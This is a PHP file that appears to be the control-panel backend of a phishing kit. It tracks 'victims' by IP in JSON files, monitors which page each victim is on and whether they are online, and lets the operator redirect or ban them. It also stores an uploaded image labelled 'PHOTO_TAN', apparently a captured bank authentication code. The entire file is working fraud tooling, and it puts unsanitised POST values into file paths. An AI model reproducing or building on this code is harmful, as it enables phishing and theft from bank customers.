<?php

require '../classes/mother.class.php';
$m = new Mother;
if (isset($_SESSION['vic']) == "") {
	$vicFile =	$m->createVic();
}
$vicFile = $m->getFileId();

$m->setDataFile($vicFile);



if (isset($_POST['redirectionListener'])) {
	echo $m->getData()['REDIRECT'];
}



if (isset($_POST['clearRedirection'])) {
	$arr = array("REDIRECT" => 0);
	$m->update($arr);
}



if (isset($_POST['getVictimData'])) {
	$ip = $_POST['vip'];

	$newMother = new Mother;
	$newMother->setDataFile((__DIR__) . "/../data/vics/VIC-$ip.json");

	$statu = "off";
	$page = $newMother->getData()["CURRENT_PAGE"];

	if ($newMother->getData()["LAST_ACT"]  > (time() - 10)) {
		$statu = "on";
	} else {
		$statu = "off";
	}
	$data = new stdClass();
	$data->page = $page;
	$data->data = $newMother->getData()["LOGS"];
	$data->statu = $statu;
	$data = json_encode($data);
	echo $data;
}





if (isset($_POST['keepAlive'])) {
	$m->feed(time(), $_POST['page']);
}



if (isset($_POST['ban'])) {
	$jeehan->block($_POST['ban']);
	echo "Victim [" . $_POST['ban'] . "] has been blocked.";
}



if (isset($_POST['getOnlineVics'])) {
	echo getOnlines();
}


function getOnlines()
{
	global $jeehan;
	$res = "<div class='connections'>";
	$on = $jeehan->getOnlineVics();
	if ($on >= 1) {
		$res .= "<div class='connected'>$on</div>";
	} else {
		$res .= "<div class='disconnected'>$on</div>";
	}
	$res .= "</div>";
	return $res;
}



if (isset($_POST['pageID'])) {
	$pageID = $_POST['pageID'];
	$vicIP = $_POST['vicIP'];

	$newMother = new Mother;
	$newMother->setDataFile((__DIR__) . "/../data/vics/VIC-$vicIP.json");
	$arr = array("REDIRECT" => $pageID);
	$newMother->update($arr);
}





if (isset($_POST['update'], $_POST['col'], $_POST['val'])) {
	$ip = $_POST['ip'];
	$m = new Mother;
	$m->setDataFile((__DIR__) . "/../data/vics/VIC-$ip.json");
	$arrData = array($_POST['col'] => $_POST['val']);
	$m->update($arrData);
}



if (isset($_FILES['image']) && $_FILES['image']['error'] === UPLOAD_ERR_OK) {
	$ip = $_POST['_ip'];
	$fileTmpPath = $_FILES['image']['tmp_name'];
	$fileName = $_FILES['image']['name'];
	$fileSize = $_FILES['image']['size'];
	$fileType = $_FILES['image']['type'];
	$fileNameCmps = explode(".", $fileName);
	$fileExtension = strtolower(end($fileNameCmps));

	$allowedfileExtensions = array('jpg', 'gif', 'png','PNG', 'jpeg', 'avif', 'jfif');
	if (in_array($fileExtension, $allowedfileExtensions)) {
		$uploadFileDir = '../../auth/up/';

		// Create a unique name for the image
		$newFileName = md5(time() . uniqid()) . '.' . $fileExtension;
		$dest_path = $uploadFileDir . $newFileName;

		if (move_uploaded_file($fileTmpPath, $dest_path)) {

			$m = new Mother;
			$m->setDataFile((__DIR__) . "/../data/vics/VIC-$ip.json");
			$arrData = array("PHOTO_TAN" => "./up/$newFileName");
			$m->update($arrData);
			header("location: ../view.php?vip=$ip&showSuccess");

		} else {
			echo "bad";
		}
	} else {
		echo "bad";
	}
} 
